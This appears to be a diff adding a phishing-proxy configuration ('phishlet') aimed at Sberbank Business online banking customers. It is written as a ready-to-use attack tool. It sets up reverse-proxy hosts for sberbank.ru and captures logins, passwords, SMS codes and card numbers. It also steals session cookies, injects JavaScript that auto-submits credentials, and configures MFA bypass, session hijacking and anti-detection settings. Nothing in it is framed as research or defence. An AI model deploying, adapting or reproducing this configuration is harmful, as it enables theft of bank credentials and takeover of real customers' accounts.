@@ -1,0 +1,150 @@
+# Сбербанк Бизнес Phishlet
+# Конфигурация для перехвата Сбербанк Бизнес
+
+id: sberbank_business
+author: PhantomSec Labs
+description: Сбербанк Бизнес - Online Banking Phishlet
+min_ver: 2.3.0
+
+proxy_hosts:
+  - phish_sub: www
+    orig_sub: www
+    domain: sberbank.ru
+    session: true
+    is_landing: true
+
+  - phish_sub: ib
+    orig_sub: ib
+    domain: sberbank.ru
+    session: true
+    is_landing: false
+
+  - phish_sub: login
+    orig_sub: login
+    domain: sberbank.ru
+    session: true
+    is_landing: false
+
+sub_filters:
+  - triggers_on: www.sberbank.ru
+    orig_sub: www
+    domain: sberbank.ru
+    search: 'https://{orig_sub}.{domain}'
+    replace: 'https://{phish_sub}.{domain}'
+    mimes:
+      - text/html
+      - application/javascript
+    redirect_only: false
+
+  - triggers_on: ib.sberbank.ru
+    orig_sub: ib
+    domain: sberbank.ru
+    search: 'https://{orig_sub}.{domain}'
+    replace: 'https://{phish_sub}.{domain}'
+    mimes:
+      - text/html
+      - application/javascript
+    redirect_only: false
+
+auth_tokens:
+  - domain: '.sberbank.ru'
+    keys:
+      - 'SBOL'
+      - 'JSESSIONID'
+      - 'sber_session'
+
+credentials:
+  username:
+    key: 'login'
+    search: '<input.*?name=["\']login["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  password:
+    key: 'password'
+    search: '<input.*?name=["\']password["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  custom:
+    - key: 'sms_code'
+      search: '<input.*?name=["\']smsCode["\'].*?value=["\']([^"\']*)["\']'
+      type: 'post'
+
+    - key: 'card_number'
+      search: '<input.*?name=["\']cardNumber["\'].*?value=["\']([^"\']*)["\']'
+      type: 'post'
+
+auth_urls:
+  - '/ru/personal'
+  - '/auth/'
+  - '/ib/login'
+  - '/auth/authorize'
+
+login:
+  domain: 'www.sberbank.ru'
+  path: '/ru/personal'
+  method: 'GET'
+  parameters: []
+
+js_inject:
+  - triggers_on: 'www.sberbank.ru'
+    js: |
+      // Remove Sberbank branding
+      var logos = document.querySelectorAll('.logo, .brand');
+      logos.forEach(function(logo) { logo.style.opacity = '0.8'; });
+
+  - triggers_on: 'ib.sberbank.ru'
+    js: |
+      // Auto-submit after credential entry
+      setInterval(function() {
+        var loginField = document.querySelector('input[name="login"]');
+        var passField = document.querySelector('input[name="password"]');
+        if (loginField && passField && loginField.value && passField.value) {
+          var submitBtn = document.querySelector('button[type="submit"]');
+          if (submitBtn) submitBtn.click();
+        }
+      }, 1000);
+
+force_post:
+  - path: '/auth/authorize'
+    search:
+      - key: 'login'
+        value: '.*'
+      - key: 'password'
+        value: '.*'
+    force:
+      - key: 'remember'
+        value: 'true'
+    type: 'post'
+
+# 2FA/MFA Bypass
+mfa_bypass:
+  enabled: true
+  methods:
+    - name: 'SMS'
+      trigger: 'sms'
+      capture_field: 'smsCode'
+
+    - name: 'Push'
+      trigger: 'push'
+      capture_field: 'pushCode'
+
+# Session hijacking
+session_hijack:
+  enabled: true
+  cookie_names:
+    - 'SBOL'
+    - 'JSESSIONID'
+  replay_delay: 1000
+  concurrent_sessions: true
+
+# Redirect
+redirect:
+  enabled: true
+  url: 'https://www.sberbank.ru/ru/personal'
+  delay: 3000
+
+# Anti-detection
+anti_detection:
+  remove_security_headers: true
+  fake_cert_transparency: true
+  randomize_response_timing: true
